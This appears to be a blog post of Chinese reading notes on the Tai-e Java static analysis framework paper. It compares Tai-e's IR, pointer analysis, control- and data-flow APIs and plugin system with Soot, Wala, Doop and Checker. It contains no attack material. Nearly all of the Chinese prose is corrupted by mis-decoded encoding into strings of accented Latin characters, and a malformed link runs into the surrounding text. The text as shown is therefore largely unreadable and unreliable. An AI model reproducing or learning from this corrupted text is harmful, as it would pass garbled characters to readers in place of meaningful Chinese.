<p>An established professor wrote to us: â€œMy students told me that it is very smooth to write code on Tai-e and Tai-e is significantly better than Soot in usability. â€œ</p>
</blockquote>
<p>ä»–ä»¬è¿˜è°ƒæŸ¥äº†ä¸€ä¸‹ä¸€äº›ç ”ç©¶ç‰²ï¼Œä»–ä»¬å°½ç®¡ä½¿ç”¨ Soot&#x2F;Wala çš„æ—¶é—´æ›´é•¿ï¼Œä»–ä»¬ä½¿ç”¨äº† Tai-e åè®¤ä¸º Tai-e æ›´åŠ çš„ â€œeasyâ€ã€‚ä»–ä»¬å¾ˆå¤šäººåœ¨ä½¿ç”¨ Soot&#x2F;Wala çš„è¿‡ç¨‹ä¸­æåŠ functionality å’Œ debugging å›°æ‰°äº†ä»–ä»¬ã€‚</p>
<p>å¾ˆæ˜æ˜¾ Tai-e å®ç°äº†ä»–çš„ç›®æ ‡ã€‚</p>
<p><strong>3.</strong> Tai-e å½±å“æ¯”è¾ƒå¹¿ï¼Œä»–ä»¬æœ‰å¼€æºçš„ä»£ç (<a href="https://github.com/pascal-lab/Tai-e)%EF%BC%8C%E4%B8%BA%E5%AD%A6%E4%B9%A0%E8%80%85%E8%AE%BE%E8%AE%A1%E7%9A%84%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E3%80%82%E5%90%B8%E5%BC%95%E4%BA%86">https://github.com/pascal-lab/Tai-e)ï¼Œä¸ºå­¦ä¹ è€…è®¾è®¡çš„é™æ€åˆ†æä»£ç ã€‚å¸å¼•äº†</a> 26 æ‰€å¤§å­¦ï¼ŒR&amp;D teams from  13 companiesï¼Œ104 æ‰€å¤§å­¦çš„å­¦ç”Ÿã€‚<del>ï¼ˆè¿™å°±æ˜¯å¼€æºçš„åŠ›é‡å˜›doge</del></p>
<h1 id="Program-Abstraction"><a href="#Program-Abstraction" class="headerlink" title="Program Abstraction"></a>Program Abstraction</h1><p>é™æ€åˆ†ææ¡†æ¶ç¨‹åºæŠ½è±¡æ¨¡å‹åŒ…æ‹¬ IRï¼Œç±»å‹ç³»ç»Ÿï¼Œç±»ç»§æ‰¿ç­‰ã€‚æ¥ä¸‹æ˜¯å¯¹ Tai-e IR çš„è¯ é‡Šã€‚</p>
<p>Tai-e çš„ IR å¾ˆå— Soot å’Œ Wala çš„å¯å‘ï¼Œå®ç°çš„æ›´åŠ ç®€æ´ï¼Œæ›´ä¾¿äºäº†è§£ IR çš„éšå«ä¿¡æ¯ã€‚<del>ï¼ˆä»€ä¹ˆ underlying intents of IRï¼Œä¸å¤ªç†è§£ï¼‰</del></p>
<p><img src="https://i.imgs.ovh/2023/10/10/LyHbN.png" alt="image-20231008214548165"></p>
<p>IR çš„è®¾è®¡ä¸Šï¼šTai-e åŒºåˆ†äº†èµ‹å€¼è¡¨è¾¾å¼çš„ç±»å‹</p>
<p>API è®¾è®¡ï¼šåœ¨è·å–è¡¨è¾¾å¼æ—¶ä½¿ç”¨äº†å…·ä½“çš„è¿”å›ç±»å‹ï¼Œé¿å…ä½¿ç”¨ç´¢å¼•</p>
<p>ç¨‹åºå…ƒç´ å¦‚å€¼ï¼Œç±»å‹ï¼Œåå­—çš„ç»„ç»‡å’Œè·å–æ–¹å¼ï¼šTai-e é›†ä¸­äº†ç´¢å¼•å˜é‡ç›¸å…³çš„ä¿¡æ¯åˆ°ä¸€ä¸ªå•ä¸€æ¥å£</p>
<p>åœ¨å›¾1ä¸­å±•ç¤ºäº†ä¸€ä¸ª binary statementï¼ˆe.g.ï¼Œx&#x3D;y+zï¼‰ï¼Œä½œä¸ºä¸€ä¸ªæ–¹æ³•çš„ processBinaryï¼Œåˆ†åˆ«è¢« Sootï¼ŒWalaï¼ŒTai-e æè¿°ã€‚</p>
<p>Soot å‡å®šäº†æ‰€æœ‰çš„ statement å†…éƒ¨æœ‰ä¸€ä¸ª â€œ&#x3D;â€ æ“ä½œç¬¦ï¼Œå«åš AssignStmt ä½†æ˜¯æ²¡æœ‰æ˜¾å¼çš„åŒºåˆ†å…·ä½“çš„ç±»å‹ã€‚è€Œï¼ŒAssignStmt æ˜¯ä¸€ä¸ªæ¯”è¾ƒåº•å±‚ï¼ˆlowest-levelï¼‰çš„æ¥å£ï¼Œè¿™å°±å¯¼è‡´ä»–éœ€è¦åœ¨ç¬¬ 5 è¡Œè¿›è¡Œç±»å‹åˆ¤æ–­ä»¥ä¿è¯ç±»å‹å®‰å…¨ã€‚<del>ï¼ˆå®è¯è¯´æˆ‘å½“æ—¶å­¦ Tai-e å°±æ˜¯ç–¯ç‹‚è¿›è¡Œç±»å‹åˆ¤æ–­çš„ï¼‰</del>ã€‚å¦å¤–ï¼ŒSoot æ€»æ˜¯è¿”å› Valueï¼ˆthe highest-level ç±»å‹ç»§æ‰¿æ¥å£ ï¼‰ï¼Œè¿™å°±å¯¼è‡´å®ƒå¿…é¡»è¦å¼ºåˆ¶è½¬æ¢ä¸ºåˆ«çš„ç±»å‹ï¼Œæ¯”å¦‚ç¬¬ 8 è¡Œçš„ Local ç±»å‹ï¼Œæ›´æœ‰è¶£çš„ä¾‹å­æ˜¯ Soot æä¾›äº† IfStmt çš„ &lt;Value getCondition()&gt; ï¼Œåœ¨è·å–æ¡ä»¶è¡¨è¾¾å¼æ—¶ä»ç„¶è¿”å› Valueï¼Œå°½ç®¡å®ƒå·²ç»çŸ¥é“è¿™æ˜¯è¿”å›ä¸€å®šæ˜¯ ConditionExprã€‚è¿™äº›ä¾‹å­éšå¼çš„åŒºåˆ†äº† IR çš„è®¾è®¡éå¸¸çš„å¾®å¦™ï¼Œä½†æ˜¯å½±å“å¾ˆæ·±åˆ»ã€‚</p>
<p>Wala å¹¶æ²¡æœ‰åˆšåˆš Soot çš„é—®é¢˜ï¼Œå› ä¸ºå®ƒé‡‡ç”¨äº†å¦å¤–ä¸€ç§è¡¨è¾¾å˜é‡çš„ç­–ç•¥ã€‚ä½¿ç”¨ 30 è¡Œä¸­çš„ getUse() ã€‚ä½†æ˜¯å®ƒè¿™æ ·ä¸ç›´è§‚ï¼Œè€Œä¸”å¯èƒ½å¢åŠ äº†è°ƒè¯•æˆæœ¬ï¼ˆå½“éœ€è¦å˜é‡çš„ä¿¡æ¯æ—¶ï¼‰ã€‚å¦å¤–ï¼ŒWala ä½¿ç”¨äº†å¦å¤–ä¸€ä¸ªæ¥å£ ir ä»¥ä» op ä¸­è·å¾—å˜é‡åå’Œç±»å‹ï¼Œè¿™è¿˜å¢åŠ äº†å­¦ä¹ æˆæœ¬ã€‚<del>ï¼ˆir è¿™ä¸ª simbol table æˆ–è®¸æœ‰ä»€ä¹ˆå¦™ç”¨å‘¢ï¼‰</del> </p>
<p>å¯ä»¥é¢„è§ Tai-e å› é¿å…äº†è¿™å‡ ä¸ªé—®é¢˜è€Œåœ¨ç®€æ´åº¦å’Œå¯ä»¥ç†è§£æ€§ä¸Šå—ç›Šã€‚ç¨‹åºä¸­æœ‰å¾ˆå¤šä¸åŒç±»å‹çš„ statements å’Œ expressionsï¼Œ</p>
<p>å¦å¤–ï¼ŒTai-e è¿˜æœ‰ä¸€äº›æ–°çš„ IR è®¾è®¡ä½¿å®ƒåœ¨æŸäº› analyses ä¸­æ›´åŠ å®¹æ˜“è¢«æ¥å—ã€‚æ¯”å¦‚å…³è”å˜é‡ v å’Œå®ƒçš„ statementï¼Œè¿™æ ·å½“ v æ”¹å˜çš„æ—¶å€™ï¼Œä¹Ÿèƒ½è·å–åˆ°å®ƒç›¸åº”çš„ statementï¼Œåšè¿›ä¸€æ­¥çš„è¡ŒåŠ¨ã€‚</p>
<h1 id="Fundamental-Analyses"><a href="#Fundamental-Analyses" class="headerlink" title="Fundamental Analyses"></a>Fundamental Analyses</h1><p>é™æ€åˆ†æè¿‘ä¼¼å…³äºæ€æ ·æŠ½è±¡è¯­ä¹‰å’Œè¿è¡Œæ—¶ç¯å¢ƒæŠ½è±¡æ•°æ®ã€‚å› æ­¤ï¼Œé™æ€åˆ†ææ¡†æ¶åº”è¯¥æä¾›åŸºæœ¬èƒ½åŠ›æ¥ç”Ÿæˆæ­¤ç±»æ§åˆ¶ç»“æ„ï¼Œä¾‹å¦‚ï¼ˆcontrol flowï¼‰æ§åˆ¶æµå’Œï¼ˆcall graphï¼‰è°ƒç”¨å›¾ã€‚</p>
<h2 id="Pointer-Analysis-Alias-Analysis"><a href="#Pointer-Analysis-Alias-Analysis" class="headerlink" title="Pointer Analysis (Alias Analysis)"></a>Pointer Analysis (Alias Analysis)</h2><p>æŒ‡é’ˆåˆ†ææ—¶éå¸¸åŸºç¡€çš„é™æ€åˆ†æï¼Œå‡ ä¹æ„å»ºäº†å…¶ä»–æ‰€æœ‰ã€‚</p>
<p>Soot æä¾›äº†ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿï¼ˆcontext-insensitiveï¼‰æŒ‡é’ˆåˆ†æ Sparkï¼Œå®ƒé«˜åº¦çš„ä¼˜åŒ–å¹¶ä¸”è¿è¡Œå¾ˆå¿«ã€‚Wala å¯¹ä¸ªä¸Šä¸‹æ–‡æ•æ„Ÿï¼ˆcontext-sensitiveï¼‰æŒ‡é’ˆåˆ†æè¿›è¡Œäº†ä¼˜åŒ–ã€‚ä¸åƒ Sootï¼ŒWala å’Œ Tai-eï¼ŒDoop åœ¨Datalogä¸­å®Œå…¨ç”³æ˜å’Œå®ç°ï¼Œæœ‰ç€æ›´åŠ çš„ clever ä¸” useful çš„è®¾è®¡ï¼Œåœ¨æœ€è¿‘è¢«è€ƒè™‘ä¸ºå®ç° proposed æŒ‡é’ˆåˆ†æç®—æ³•çš„ä¸»æµå¹³å°ã€‚ä»–ä»¬éƒ½å®ç°äº†ç›¸ä¼¼çš„ **Andersen-style **ç®—æ³•ã€‚</p>
<p>åœ¨è®¾è®¡ Java é™æ€åˆ†æç³»ç»Ÿæ—¶ï¼Œæœ‰ä¸€äº›å…³é”®ç‚¹éœ€è¦è€ƒè™‘</p>
<ul>
<li>ä¸€ä¸ª <strong>representation</strong> è¡¨ç¤º points-to information</li>
<li>ä¸€ä¸ª <strong>context manager</strong> ä»¥å¤„ç†ä¸Šä¸‹æ–‡æ•æ„Ÿï¼ˆcontext sensitivityï¼‰</li>
<li>ä¸€ä¸ª <strong>heap manager</strong> å †ç®¡ç†æ¨¡å‹</li>
<li>ä¸€ä¸ª <strong>solver</strong> ä»¥ä¼ æ’­ points-to ä¿¡æ¯</li>
<li></li>
</ul>
<p>å‰ä¸¤è€… Tai-e å’Œå…¶ä»–çš„æ¡†æ¶æœ‰æ‰€ä¸åŒ</p>
<h3 id="representation"><a href="#representation" class="headerlink" title="representation"></a>representation</h3><p>Spark å’Œ Wala éƒ½é‡‡ç”¨äº†æ··åˆçš„ points-to setï¼Œå½“ setçš„å¤§å°å°äºæŸä¸ªå…·ä½“çš„å€¼ï¼Œä»–å°±ç”¨æ•°ç»„å­˜å‚¨ï¼Œå¦åˆ™ä½¿ç”¨é€šå¸¸çš„ bit set å­˜å‚¨ã€‚Tai-e ä¹Ÿä½¿ç”¨äº†æ··åˆçš„æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ bit set çš„è®¾è®¡ä¸Šæœ‰ä¸€äº›ä¸ä¸€æ ·ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/10/LyM5R.png" alt="image-20231009091537569"></p>
<p>åœ¨å›¾2ä¸­ï¼Œå³ä¾§çš„æ˜¯ Tai-e çš„è®¾è®¡ï¼Œä½¿ç”¨äº†ç±»ä¼¼è™šæ‹Ÿå†…å­˜çš„é¡µè¡¨æ€æƒ³ï¼Œä»–ä»¬åœ¨å®è·µä¸­å¾€å¾€ä½¿ç”¨äºŒçº§é¡µè¡¨ï¼Œåœ¨ä¸Šä¸‹æ–‡æ•æ„Ÿçš„æŒ‡é’ˆåˆ†æä¸­è¿™å¹³å‡èŠ‚çº¦äº† 23%ï¼ˆup to 40%ï¼‰ çš„å†…å­˜ã€‚å½“ä½œè€…æŠŠå†…å­˜é™åˆ¶ä¸ºæŸä¸€ä¸ªå€¼æ¯”å¦‚ 8Gï¼Œè¿™æœ‰åˆ©äº Tai-e æ‹“å±•æ›´å¤šçš„åŸºå‡†ã€‚ä½œè€…æ³¨æ„åˆ° Doop æ˜¯ç”³æ˜å¼çš„ï¼Œä»–çš„ points-to é›†åˆè¡¨ç¤ºå¼€å‘è€…æ— æ³•è·å–ï¼Œå¹¶ä¸”ä¸åŒçš„ Datalog å¼•æ“å¯èƒ½æœ‰ä¸åŒçš„è¡¨ç¤ºã€‚</p>
<h3 id="context-manager"><a href="#context-manager" class="headerlink" title="context manager"></a>context manager</h3><p>ä¸Šä¸‹æ–‡æ•æ„Ÿè¢«å¹¿æ³›ç”¨äºæé«˜ Java æŒ‡é’ˆåˆ†æçš„ç²¾åº¦ã€‚ä½œè€…éœ€è¦ä¸€ä¸ªç®¡ç†ä¸Šä¸‹æ–‡æ•æ„Ÿå˜é‡ï¼ˆcall-site-ï¼Œobject-ï¼Œtype-sensitivityï¼‰çš„ç­–ç•¥ã€‚</p>
<p>Soot æ²¡æœ‰ä¸€ä¸ªæç¬‘çš„ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆåˆ†æç³»ç»Ÿï¼ŒSpark æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡ä¸æ•æ„Ÿçš„ã€‚Paddle æ˜¯ Soot çš„ BDD-based ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆåˆ†æï¼Œä½†æ˜¯å®ƒæ¯” Doop ä½æ•ˆå¾ˆå¤šï¼Œå¹¶ä¸”å®ƒè¿˜å¾ˆä¹…æ²¡ç»´æŠ¤äº†ã€‚Doop æä¾›äº†ä¸€äº›ä¼˜é›…çš„è§„åˆ™ä»¥å¤„ç†ä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œç„¶è€Œå› ä¸º Datalog çš„é™åˆ¶ï¼Œå¯¹æ¯ä¸€ä¸ªä¸Šä¸‹æ–‡é•¿åº¦ï¼Œæ–¹æ³•è°ƒç”¨ï¼Œå †å†…å­˜ï¼Œå¼€å‘è€…ä¸å¾—ä¸å†™ä¸€ä¸ªå®ç°ï¼Œå¯¼è‡´äº†ä¸€äº›è£èª‰ã€‚<del>ï¼ˆæ„Ÿè§‰ Doop ä¹Ÿå¯ä»¥æœ‰æŒºå¥½çš„æ‹“å±•æ€§ï¼‰</del>ã€‚</p>
<p>ä¸ä¹‹ç›¸åï¼ŒTai-e æ˜¯å‘½ä»¤å¼çš„ï¼Œå¯¹äºç›¸ä¼¼çš„ä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†æå®ç°ï¼Œå®ƒèƒ½å¤Ÿè½»æ˜“çš„æŠŠä¸Šä¸‹æ–‡é•¿åº¦è§†ä¸ºè¾“å…¥å‚æ•°ã€‚è€Œ Wala åªæä¾›äº†å‡½æ•°è°ƒç”¨çš„ä¸Šä¸‹æ–‡ç®¡ç†ï¼Œå¹¶ä¸”å®ƒçš„å †ä¸Šä¸‹æ–‡æ˜¯ç›´æ¥ç»§æ‰¿è‡ªåŒ…å«å®ƒçš„è°ƒç”¨ç‚¹ï¼ˆcall siteï¼‰çš„å‡½æ•°çš„å †å¯¹è±¡ã€‚ç›¸æ¯”äº Walaï¼ŒTai-e åœ¨è¿™é‡Œæ›´åŠ çµæ´»ã€‚</p>
<p>Tai-a è¿˜æä¾›äº†å¯é€‰çš„ä¸Šä¸‹æ–‡æ•æ„Ÿå·¥å…·å¹¶ä¸”åœ¨å¤§å‹å’Œå¤æ‚çš„ Java ç¨‹åºä¸­ä¹Ÿæœ‰ä¸é”™çš„ç²¾åº¦ã€‚ç°åœ¨æ¯”è¾ƒå…ˆè¿›çš„å¯é€‰çš„æŒ‡é’ˆåˆ†ææ¯”å¦‚ **Zipper ,Zipperğ‘’ , Scaler å’Œ Mahjong **éƒ½è¢« Tai-e é›†æˆè¿›å»äº†ï¼Œä½œä¸ºä¸€ä¸ªç»Ÿä¸€çš„çš„æŒ‡é’ˆåˆ†ææ¡†æ¶ä»¥æ¯”è¾ƒä¸åŒçš„ä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†ææ–¹æ³•ã€‚</p>
<h2 id="Control-x2F-Data-Flow-Analysis"><a href="#Control-x2F-Data-Flow-Analysis" class="headerlink" title="Control&#x2F;Data Flow Analysis"></a>Control&#x2F;Data Flow Analysis</h2><h3 id="Control-Flow-Analysis"><a href="#Control-Flow-Analysis" class="headerlink" title="Control Flow Analysis"></a>Control Flow Analysis</h3><p>CFG å°½ç®¡åŸºç¡€ï¼Œä½†æ˜¯å¦‚ä½•è®©å¼€å‘è€…æ˜“äºä½¿ç”¨ï¼Œä¹Ÿä¸å®¹æ˜“ã€‚</p>
<p>Tai-e å¯¹è¾¹è¿›è¡Œåˆ†ç±»ï¼Œä¸ Sootï¼ŒWalaï¼ŒChecker ç›¸æ¯”åˆ†ç±»äº†æ¯”å¦‚IF_TRUEï¼ŒIF_FAUSEï¼ŒCAUGHT_EXCEPTION çš„è¾¹ç±»å‹ã€‚å°½ç®¡ä»–ä»¬ä¹Ÿå¯ä»¥ä»ç›¸å¯¹åº”çš„èŠ‚ç‚¹æˆ–è€… IR ä¸­è·å–è¾¹çš„ç±»å‹ï¼Œå¾ˆä¸æ–¹ä¾¿å°±æ˜¯è¯´ã€‚</p>
<p>å¼‚å¸¸çš„è¾¹å¯¹ç¨‹åºåˆ†æçš„å½±å“å¾ˆå¤§ï¼Œæœ‰ä¸¤ç§å¼‚å¸¸ï¼Œæ˜¾å¼çš„ï¼ˆthrowï¼‰ä¸éšå¼çš„ï¼Œæ˜¾ç¤ºåº”å½“è¢« catch å¤„ç†ï¼Œéšå¼çš„ä¸€åœºè¢« JVM æŠ›å‡ºï¼Œä¸€ä¸ªå®Œæ•´çš„ CFG åˆ†æåº”è¯¥åŒ…å«äºŒè€…ï¼Œä½†æ˜¯éšå¼çš„å¼‚å¸¸æ§åˆ¶æµåˆéå¸¸çš„å¤šå¹¶ä¸”ä»–ä»¬å¯¹æ§åˆ¶æµçš„å½±å“ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œå¦‚æœè€ƒè™‘è¿›éšå¼çš„å¼‚å¸¸æ§åˆ¶æµå¯èƒ½ä¼šå‡å°ç¨‹åºçš„ç²¾åº¦å’Œå¯ç”¨æ€§ã€‚ä¸ Walaï¼ŒSpotBugs å’Œ Checker ä¸åŒçš„æ˜¯ï¼ŒTai-e å’Œ Soot åŒºåˆ†äº†æ˜¾å¼å’Œéšå¼çš„å¼‚å¸¸æ§åˆ¶æµï¼Œå…è®¸ç”¨æˆ·è‡ªå·±æ·»åŠ ã€‚</p>
<h3 id="Data-Flow-Analysis"><a href="#Data-Flow-Analysis" class="headerlink" title="Data Flow Analysis"></a>Data Flow Analysis</h3><p>å¼€å‘è€…ä¸ºäº†å®ç°æ•°æ®æµåˆ†æï¼Œé€šå¸¸è·Ÿéšæ•°æ®æµåˆ†æç³»ç»Ÿçš„æ¥å£æ¥å®ç°ï¼Œå…·ä½“æœ‰ï¼ˆ1ï¼‰data facts æŠ½è±¡å’Œåˆå§‹åŒ–ï¼ˆ2ï¼‰è®©ä¸åŒ statements è¿‘ä¼¼çš„è½¬æ¢å‡½æ•°ï¼ˆ3ï¼‰meet join æ“ä½œè¿ç®—ï¼Œä½œä¸ºåˆå¹¶ data facts çš„ä¾æ®ã€‚</p>
<h4 id="Data-facts-initialization"><a href="#Data-facts-initialization" class="headerlink" title="Data facts initialization"></a>Data facts initialization</h4><p>Wala ä¸æ”¯æŒåœ¨åˆ†æä¸­åˆå§‹åŒ– data factsï¼Œä»–æŠŠç›¸å…³çš„ API æ”¾åˆ°äº† solver ä¸­ï¼Œåœ¨å®ç°åˆ†æçš„è¿‡ç¨‹ä¸­å¯¼è‡´äº†ä¸å¿…è¦çš„å®ç°ï¼ˆéœ€è¦å»äº†è§£ solver çš„ç»†èŠ‚ï¼‰ã€‚</p>
<h4 id="Edge-transfer-function"><a href="#Edge-transfer-function" class="headerlink" title="Edge transfer function"></a>Edge transfer function</h4><p>Soot å’Œ Checker å¹¶æ²¡æœ‰æ˜¾å¼åœ°æ”¯æŒ edge transfer functionã€‚</p>
<p>Edge transfer ä¸ node transfer ä¸åŒï¼Œedge transfer å¯ä»¥å…è®¸ä¸åŒçš„ data facts æ²¿ç€è¾¹ä¼ é€åˆ°åç»§çš„ nodeï¼ˆèŠ‚ç‚¹ï¼‰ï¼Œåˆ©ç”¨äº†åˆ†æ”¯ä¿¡æ¯åˆ›é€ äº†æ›´é«˜æ•ˆçš„åˆ†æã€‚å¦‚æœ edge transfer å‡½æ•°ä¸ºç©ºï¼Œé‚£ä¹ˆè¿™æ—¶ï¼Œåˆ†æå°±å›é€€æˆä¸ºåªæœ‰ node transfer å‡½æ•°çš„åˆ†æã€‚åœ¨ Soot ä¸­ï¼Œå®ƒä¸ºäº†å¤„ç†åˆ†æ”¯ä¿¡æ¯ï¼Œå¼€å‘è€…éœ€è¦æ‹“å±•ä¸€ä¸ªç‰¹æ®Šçš„ analysis å«åš BranchedFlowAnalysis è€Œä¸”è¿˜è¦å®ç°å…¶ edges å’Œ nodes çš„é€»è¾‘ï¼Œè¿™å¾ˆä¸æ–¹ä¾¿ï¼Œåœ¨è®¾è®¡ä¸Šä¹Ÿæœ‰ä¸€äº›ç¹çã€‚ Checker ä¹Ÿä¸æ˜¾å¼åœ°æ”¯æŒ edge tansferï¼Œä½†æ˜¯ä»–åœ¨å¤„ç† node transfer ä¸­åŒºåˆ†äº†ä¸åŒçš„ç±»å‹ï¼Œæ¯”å¦‚ then å’Œ else branchesã€‚æ±‚è§£å™¨ä¼šæ²¿ç€è¿™ä¸ªä¼ æ’­ä¿¡æ¯ã€‚</p>
<p>Checker ä¸å…¶ä»–æ¶æ„æœ‰æ‰€ä¸åŒï¼Œå®ƒé€šè¿‡å…è®¸å¼€å‘è€…ç»™ type å†™ qualifiersï¼ˆå°¤å…¶æ˜¯ Java annotationsï¼‰ï¼Œå¢å¼ºäº† Java çš„ç±»å‹ç³»ç»Ÿï¼Œè¿™ç§æ–¹æ³•åœ¨å®è·µä¸­æé«˜äº†åˆ†æçš„æ•ˆç‡ã€‚ä»–ä»¬ï¼ˆTai-eï¼‰å¯èƒ½ä¼šåœ¨è¿™æ–¹é¢ç»§ç»­åšä¸€äº›ç ”ç©¶ï¼Œå¦‚ä½•åˆå¹¶è¿›è¿™ç§ç±»å‹ç³»ç»Ÿã€‚</p>
<h1 id="NEW-ANALYSIS-DEVELOPMENT"><a href="#NEW-ANALYSIS-DEVELOPMENT" class="headerlink" title="NEW ANALYSIS DEVELOPMENT"></a>NEW ANALYSIS DEVELOPMENT</h1><p>é™æ€åˆ†ææ¡†æ¶åº”è¯¥æä¾›ä¸€ä¸ªæœºåˆ¶ä»¥åˆå¹¶è¿›æ–°çš„ analysesï¼ŒåŒ…æ‹¬è¿‡ç¨‹å†…å’Œè¿‡ç¨‹é—´çš„åˆ†æã€‚Tai-e æ”¯æŒè¿™äº›åŠŸèƒ½ä½¿å¾—å…¶æ˜“äºå¼€å‘å’Œå¹¶å…¥æ–°çš„ analysisã€‚</p>
<h2 id="Past-Work"><a href="#Past-Work" class="headerlink" title="Past Work"></a>Past Work</h2><p>Doop å¾ˆè‡ªç„¶åœ°æ”¯æŒ interactive analysisï¼ˆæŒ‡çš„åº”è¯¥æ˜¯è¦å’ŒæŒ‡é’ˆåˆ†æäº¤äº’çš„åˆ†æå¦‚ reflection analysisï¼Œexception analysisç­‰ï¼‰å¹¶ä¸”èƒ½å¤Ÿäº§ç”Ÿä¼˜é›…çš„å®ç°ï¼ŒDoop ä» Datalog çš„ç”³æ˜å¼èƒ½åŠ›ä¸­è·ç›Šï¼Œç„¶è€Œ Doop ä¹Ÿå—é™äº Datalog åœ¨å®ç° analysis æ—¶éœ€è¦ not-set-based latticesã€‚<del>ï¼ˆä¸æ‡‚ï¼‰</del>ï¼Œå¹¶ä¸”ç”±äº Datalog solver é‡‡ç”¨äº† analysis-independent æ•°æ®ç»“æ„å’Œæ‰§è¡Œç­–ç•¥ï¼Œå®ƒæ¯”è¾ƒéš¾å¯¹å…·ä½“çš„ analyses ä¼˜åŒ–ã€‚æœ€ç»ˆï¼Œæ¨è¿›äº¤äº’åˆ†æçš„å‘½ä»¤å¼æ¡†æ¶æœ‰å¾ˆé«˜çš„å‘¼å£°ã€‚ä½œä¸ºä»£è¡¨ï¼ŒSoot ç¼ºå°‘äº†è¿™ä¸€éƒ¨åˆ†è€Œ Wala åšåˆ°äº†ä¸€å®šç¨‹åº¦ã€‚</p>
<p>Wala æä¾›äº†ä¸€ä¸ªæ·»åŠ æ–°çš„å¯ä»¥å’Œ pointer analysis äº¤äº’çš„ analysis çš„æ–¹æ³•ï¼Œä½†æ˜¯æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œç®€å•åœ°è¯´ï¼Œå¼€å‘è€…éœ€è¦å®ç°ä¸€ä¸ªå«åš ContextSelector çš„æ¥å£æ¥å…·ä½“è¯´æ˜ç›¸å…³çš„è°ƒç”¨ç‚¹ï¼ˆcall siteï¼‰ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œä¸ºäº†åˆ†æåå°„çš„è°ƒç”¨ <code>v=c.newInstance()</code>ï¼Œå¼€å‘è€…éœ€è¦ç¼–å†™ ContextSelectorä»¥è¯†åˆ«è¿™ä¸ª call site å¹¶ä¸”è·å–è¢« c æŒ‡å‘çš„ Class objectsï¼Œç§°ä½œ COï¼Œç„¶åå¼€å‘è€…éœ€è¦å®ç° ContextInterpreter ä»¥ç”Ÿæˆä¸åŒçš„è™šæ„ä½†æ˜¯ç­‰æ•ˆçš„ IRsï¼Œæ ¹æ®ä» CO ä¸­åˆ†æå‡ºçš„ç±»å‹ï¼Œå«åšTã€‚ç„¶åè¿™äº›ç”Ÿæˆçš„ IRs å›åˆ°æŒ‡é’ˆåˆ†æä¸­ç»´æŒåå°„è°ƒç”¨çš„æ¸…æ™°åº¦ï¼ˆresolutionï¼‰ã€‚</p>
<p>è¿™ä¸ªæ–¹æ³•éå¸¸çš„ç›´ç™½ä½†æ˜¯å¯¹æŒ‡é’ˆåˆ†æçš„äº¤äº’ä¿ƒè¿›æœ‰ä¸€å®šçš„é™åˆ¶ã€‚</p>
<ol>
<li>å¯¹äºå…·ä½“çš„åˆ†æï¼Œå¼€å‘è€…åªèƒ½ä¸“æ³¨äºå¹¶è§£å†³ç›¸å…³çš„ call siteï¼›ç›‘è§†ç‰¹å®šå˜é‡çš„ points-to information çš„èƒ½åŠ›æ˜¯éœ€è¦çš„ï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œåœ¨å¼‚å¸¸åˆ†æä¸­ï¼Œå¦‚æœå˜é‡ e points-to é›†åˆåœ¨ throw çš„è¿‡ç¨‹ä¸­è¢«æ”¹å˜äº†ï¼Œç›¸åº”äº catch å˜é‡çš„ points-to é›†åˆå°±åº”è¢«æ›´æ–°äº†ã€‚</li>
<li>åœ¨è®¸å¤šæƒ…å†µä¸‹ç›´æ¥æ›´æ–°è°ƒç”¨å›¾è¾¹æˆ–points-to é›†åˆæ›´ç®€å•ï¼Œè¿™å¯ä»¥é˜²æ­¢åˆ›å»ºè¿‡å¤šçš„è™šå‡ IRï¼Œå¹¶ä¸”è°ƒç”¨æ±‚è§£å™¨é‡æ–°åˆ†æåˆ›å»ºçš„ä»£ç ã€‚</li>
</ol>
<p>Helm ç­‰äººæå‡ºä¸€ç§åŠ¨æ€å†™ä½œå„ç§åˆ†æçš„æ–¹æ³•ï¼Œå³ä½¿å…·æœ‰ä¸åŒçš„åˆ†ææ ¼ã€‚ä½†æ˜¯è¿™ç§æ–¹æ³•è¿‡äºå¤æ‚æ— æ³•è§£å†³ä½œè€…çš„é—®é¢˜ã€‚<del>ï¼ˆè§£å†³çš„ä¸»è¦é—®é¢˜ä¸æ˜¯ friendly å˜›ï¼Œè¿™æœ¬èº«å°±æœ‰ä¸€ç‚¹çŸ›ç›¾çš„ï¼‰</del></p>
<p>ä¸ºäº†ä»å®è·µä¸Šä¿ƒè¿›æ–° analysisï¼ˆé‚£äº›éœ€è¦å’ŒæŒ‡é’ˆåˆ†æäº¤äº’çš„ analysisï¼‰çš„å¼€å‘ï¼Œåœ¨ Tai-e ä¸­ï¼Œä½œè€…æå‡ºä¸€ç§ç®€å•ä¸”æç¬‘çš„æ–¹æ³• analysis plugin systemã€‚å½“å‰æœ‰å¾ˆå¤šåŸºäºè¿™ä¸ªç³»ç»Ÿçš„æ’ä»¶ï¼ŒåŒ…æ‹¬äº†åŸºç¡€çš„æ¯”å¦‚åå°„å’Œå¼‚å¸¸åˆ†æï¼Œå®¢ä½“æ¯”å¦‚æ±¡ç‚¹è¿½è¸ªåˆ†æï¼Œå…¬å…±å·¥å…·æ¯”å¦‚ analysis timer å’Œ constraint checkerã€‚</p>
<h2 id="Basic-Idea"><a href="#Basic-Idea" class="headerlink" title="Basic Idea"></a>Basic Idea</h2><p><img src="https://i.imgs.ovh/2023/10/10/Lywrp.png" alt="image-20231009202348399"></p>
